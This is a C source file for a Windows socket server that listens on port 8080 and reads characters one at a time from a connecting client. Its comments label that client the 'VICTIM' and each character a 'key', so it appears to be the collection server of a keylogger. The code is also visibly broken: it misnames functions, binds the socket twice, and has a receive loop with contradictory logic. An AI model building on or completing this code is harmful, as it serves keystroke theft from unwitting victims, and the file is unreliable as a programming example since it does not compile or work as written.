#include <stdio.h>
#include <windows.h>
#include <winsock.h>

#define WSA_VERSION_CODE 0x202
#define SERV_ADDR "127.0.0.1" 
SOCKET server_socket, client_socket;

DWORD WINAPI client_handler(LPVOID);

int main(int argc, char** argv){
    
    WSADATA wsadata;
    HANDLE thread_handle;
    DWORD t_id, t_exit_code, bind_result;
    SOCKADDR_IN server_addr;

    //INITIALIZE WIN SOCKET API
    if(WSAStartup(WSA_VERSION_CODE, &wsadata) == 0){
        printf("WSA initialized successfully \n");
    }else{
        printf("WSA initialization failed. Err code:%d", getLastError());
        WSACleanup();
        return -1;
    }

    //CREATE SERVER SOCKET TO BIND
    server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(server_socket == INVALID_SOCKET){
        printf("Socket initialization failed. Err code:%d", getLastError());
        WSACleanup();
        return -1;
    }
    printf("Socket initialized successfully \n");

    //CONFIGURE SERVER ADDRESS
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(8080);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    //BIND SOCKET TO ADDRESS
    bind_result = bind(server_socket, (SOCKADDR*)&server_addr, sizeof(server_addr));
    if(bind_result == SOCKET_ERROR){
        printf("Socket binding failed. Err code:%d", getLastError());
        closesocket(server_socket);
        WSACleanup();
        return -1;
    }
    printf("Socket bound to address successfully \n");

    //INITIALIZE SOCKET SERVER ADDRESS TO BIND
    server_addr.sin_addr.s_addr = inet_addr(SERV_ADDR);
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(8080);

    //BIND SERVER IP WITH THE SOCKET
    bind_result = bind(server_socket, (SOCKADDR*)&server_addr, sizeof(server_addr));
    if(bind_result == SOCKET_ERROR){
        printf("Socket binding failed. Err code:%d", getLastError());
        closesocket(server_socket);
        WSACleanup();
        return -1;
    }else{ 
        printf("Socket bound to address successfully \n");
    }

    //LISTEN FOR THE CLIENT (VICTIM)
    if(!listen(server_socket, 1)){
        printf("Listening for the clients...\n");

        //ACCEPT THE CLIENT, GET ITS ADDRESS AND CREATE A THREAD FOR IT
        client_socket = accept(server_socket, NULL, NULL);
        if(client_socket != INVALID_SOCKET){
            print("Client connected.\n");
            thread_handle = CreateThread(NULL, 0, &client_handler, NULL, 0, &t_id);

            //WAIT UNTIL THE THREAD TERMINATES
            WaitForSingleObject(thread_handle, INFINITE);
            GetExitCodeThread(thread_handle, &t_exit_code);
            TerminateThread(thread_handle, t_exit_code);
        }
    }else{
        printf("An error ocurred during listening to clients. Err code:%d", GetLastError());
        closesocket(server_socket);
        WSACleanup();
    }

    //AFTER THE OPERATION TERMINATES, SHUTDOWN AND THEN CLOSE THE SOCKETS
    shutdown(client_socket, SD_BOTH);
    shutdown(server_socket, SD_BOTH);
    closesocket(client_socket);
    closesocket(server_socket);
    WSACleanup();

    return 0;
}

DWORD WINAPI clientHandler(LPVOID params){
    BOOL thread_alive = TRUE;
    DWORD bytes_transferred;
    CHAR char_to_recv;

    while(thread_alive){
        bytes_transferred = recv(client_socket, &char_to_recv, 1, 0);
        if(bytes_transferred > 0){
            if(char_to_recv == '\0'){
                thread_alive = FALSE;
                printf("Client disconnected\n");
            }else if(!bytes_transferred){
                Sleep(1000);
            }else{
                printf("Unable to receive key. Error code: %d\n", WSAGetLastError());
                thread_alive = FALSE;
                return -1;
            }
        }
    }
}